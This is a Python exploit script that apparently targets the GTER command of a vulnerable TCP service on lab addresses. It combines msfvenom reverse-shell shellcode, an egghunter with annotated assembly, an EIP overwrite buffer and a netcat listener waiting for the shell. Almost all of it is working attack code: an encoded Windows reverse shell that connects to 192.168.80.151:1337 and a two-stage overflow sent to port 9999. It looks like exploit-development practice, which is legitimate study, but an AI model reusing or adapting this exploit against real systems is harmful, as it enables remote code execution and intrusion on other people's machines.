import time
import socket
import subprocess


# root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.80.151 lport=1337 -b '\x00\x0a\x0d' -e x86/alpha_mixed BufferRegister=EDI -f python -v shellcode
# No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# No Arch selected, selecting Arch: x86 from the payload
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 702 (iteration=0)
# x86/alpha_mixed chosen with final size 702
# Payload size: 702 bytes
# Final size of python file: 3768 bytes
shellcode =  ""
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x49\x6c\x6a\x48\x4e\x62\x75\x50"
shellcode += "\x57\x70\x73\x30\x31\x70\x4b\x39\x48\x65\x74\x71"
shellcode += "\x59\x50\x55\x34\x4c\x4b\x42\x70\x66\x50\x6c\x4b"
shellcode += "\x53\x62\x76\x6c\x4e\x6b\x53\x62\x46\x74\x6e\x6b"
shellcode += "\x53\x42\x56\x48\x76\x6f\x6c\x77\x72\x6a\x46\x46"
shellcode += "\x36\x51\x39\x6f\x6e\x4c\x47\x4c\x50\x61\x31\x6c"
shellcode += "\x76\x62\x74\x6c\x61\x30\x4f\x31\x38\x4f\x76\x6d"
shellcode += "\x46\x61\x69\x57\x59\x72\x39\x62\x30\x52\x30\x57"
shellcode += "\x4c\x4b\x52\x72\x74\x50\x6e\x6b\x72\x6a\x65\x6c"
shellcode += "\x4c\x4b\x32\x6c\x44\x51\x30\x78\x6d\x33\x52\x68"
shellcode += "\x36\x61\x4a\x71\x52\x71\x4c\x4b\x56\x39\x45\x70"
shellcode += "\x56\x61\x6a\x73\x6c\x4b\x53\x79\x57\x68\x79\x73"
shellcode += "\x37\x4a\x62\x69\x4e\x6b\x75\x64\x4e\x6b\x43\x31"
shellcode += "\x69\x46\x45\x61\x4b\x4f\x4c\x6c\x6a\x61\x48\x4f"
shellcode += "\x54\x4d\x45\x51\x58\x47\x56\x58\x4d\x30\x44\x35"
shellcode += "\x4b\x46\x46\x63\x43\x4d\x68\x78\x77\x4b\x43\x4d"
shellcode += "\x34\x64\x61\x65\x38\x64\x56\x38\x4e\x6b\x53\x68"
shellcode += "\x45\x74\x55\x51\x58\x53\x70\x66\x6c\x4b\x46\x6c"
shellcode += "\x32\x6b\x4e\x6b\x46\x38\x77\x6c\x66\x61\x49\x43"
shellcode += "\x4e\x6b\x43\x34\x4e\x6b\x55\x51\x7a\x70\x6d\x59"
shellcode += "\x37\x34\x71\x34\x65\x74\x43\x6b\x33\x6b\x63\x51"
shellcode += "\x71\x49\x50\x5a\x70\x51\x49\x6f\x69\x70\x73\x6f"
shellcode += "\x43\x6f\x31\x4a\x6e\x6b\x42\x32\x5a\x4b\x4c\x4d"
shellcode += "\x53\x6d\x61\x78\x77\x43\x70\x32\x73\x30\x57\x70"
shellcode += "\x61\x78\x34\x37\x53\x43\x34\x72\x53\x6f\x31\x44"
shellcode += "\x30\x68\x30\x4c\x42\x57\x77\x56\x63\x37\x79\x6f"
shellcode += "\x69\x45\x6f\x48\x4a\x30\x35\x51\x53\x30\x73\x30"
shellcode += "\x76\x49\x68\x44\x31\x44\x72\x70\x35\x38\x64\x69"
shellcode += "\x6f\x70\x50\x6b\x65\x50\x4b\x4f\x58\x55\x30\x50"
shellcode += "\x72\x70\x52\x70\x50\x50\x73\x70\x52\x70\x61\x50"
shellcode += "\x32\x70\x51\x78\x79\x7a\x46\x6f\x69\x4f\x69\x70"
shellcode += "\x79\x6f\x4a\x75\x6c\x57\x62\x4a\x43\x35\x61\x78"
shellcode += "\x4f\x30\x69\x38\x72\x70\x6f\x67\x72\x48\x54\x42"
shellcode += "\x55\x50\x65\x55\x75\x69\x4f\x79\x6a\x46\x33\x5a"
shellcode += "\x56\x70\x33\x66\x62\x77\x50\x68\x7a\x39\x6d\x75"
shellcode += "\x50\x74\x33\x51\x49\x6f\x48\x55\x6b\x35\x69\x50"
shellcode += "\x51\x64\x46\x6c\x4b\x4f\x42\x6e\x47\x78\x52\x55"
shellcode += "\x48\x6c\x63\x58\x48\x70\x4d\x65\x49\x32\x33\x66"
shellcode += "\x79\x6f\x39\x45\x51\x78\x53\x53\x72\x4d\x63\x54"
shellcode += "\x55\x50\x6d\x59\x38\x63\x71\x47\x53\x67\x36\x37"
shellcode += "\x56\x51\x68\x76\x70\x6a\x65\x42\x56\x39\x50\x56"
shellcode += "\x49\x72\x49\x6d\x33\x56\x49\x57\x33\x74\x77\x54"
shellcode += "\x47\x4c\x37\x71\x75\x51\x6e\x6d\x53\x74\x67\x54"
shellcode += "\x72\x30\x49\x56\x63\x30\x57\x34\x50\x54\x70\x50"
shellcode += "\x36\x36\x61\x46\x51\x46\x52\x66\x51\x46\x62\x6e"
shellcode += "\x61\x46\x51\x46\x50\x53\x70\x56\x75\x38\x70\x79"
shellcode += "\x4a\x6c\x57\x4f\x4f\x76\x69\x6f\x6a\x75\x6b\x39"
shellcode += "\x59\x70\x52\x6e\x62\x76\x30\x46\x59\x6f\x74\x70"
shellcode += "\x61\x78\x47\x78\x4d\x57\x67\x6d\x65\x30\x79\x6f"
shellcode += "\x6a\x75\x4f\x4b\x6a\x50\x6f\x45\x4d\x72\x42\x76"
shellcode += "\x62\x48\x6d\x76\x6c\x55\x4d\x6d\x6f\x6d\x59\x6f"
shellcode += "\x39\x45\x45\x6c\x67\x76\x61\x6c\x66\x6a\x6d\x50"
shellcode += "\x39\x6b\x49\x70\x33\x45\x57\x75\x4d\x6b\x63\x77"
shellcode += "\x45\x43\x72\x52\x42\x4f\x31\x7a\x63\x30\x52\x73"
shellcode += "\x4b\x4f\x59\x45\x41\x41"

# first payload
Eggy  = 'T00WT00W'
Eggy += shellcode
Eggy += '\x41' * (1000-len(shellcode)-10)
Eggy += '\r\n'

'''
or dx,0x0fff      # loop thru memory pages
inc edx by 1      # loop thru addresses for given page
push edx          # save EDX in stack before syscall
push byte +0x43   # push 0x43 (syscall id for NtDisplayString) onto the stack
pop eax           # store it in EAX
int 0x2e          # make syscall
cmp al,0x5        # compare lower portion of EAX with 5 to check for access violations
pop edx           # restore EDX after syscal was made
jz 0x0            # if true go back to first instruction and check the next memory page
mov eax,w00t      # else move egg marker value to eax
mov edi,edx       # move pointer to EDI
scasd             # check for egg value match
jnz 0x5           # if true jump to increment EDX and check the next memory address in page
scasd             # else increment EDI and check the value again (to make sure it's not egghunter code)
jnz 0x5           # if true jump to increment EDX and check the next memory address in page
jmp edi           # else egg marker found! execute shellcode positioned right after 
'''
EggHunter = '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7\x90'

'''
spike file
----------
s_string("GTER");
s_string(" ");
s_string_variable("FUZZ");
s_string("\r\n");
sleep(1);
'''

# second payload
buffer  = 'GTER /.:/'                                           # vulnerable command
'''
0:  5a                      pop    edx
1:  4d                      dec    ebp
2:  5f                      pop    edi
'''
buffer += '\x5a\x4d\x5f'                                        # stack alignment to compensate for changes made by GTER command
buffer += EggHunter                                             # hunt baby hunt
buffer += '\x41' * (147-3-len(EggHunter))                       # filler to save pointer
buffer += '\xb1\x11\x50\x62'                                    # EIP [call eax] to get back to the start of our the buffer
buffer += '\x43' * (5000-9-147-4-2)                             # filler
buffer += '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.80.133', 9999))
	print '[+] Sending %s bytes of eggy' %len(Eggy)
	s.send(Eggy)
	s.close
	time.sleep(1)
except Exception as e:
	print e

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.80.133', 9999))
        print '[+] Sending %s bytes of buffer' %len(buffer)
        time.sleep(1)
        s.send(buffer)
	subprocess.call(['nc -nlvp 1337'], shell=True)
except Exception as e:
        print e

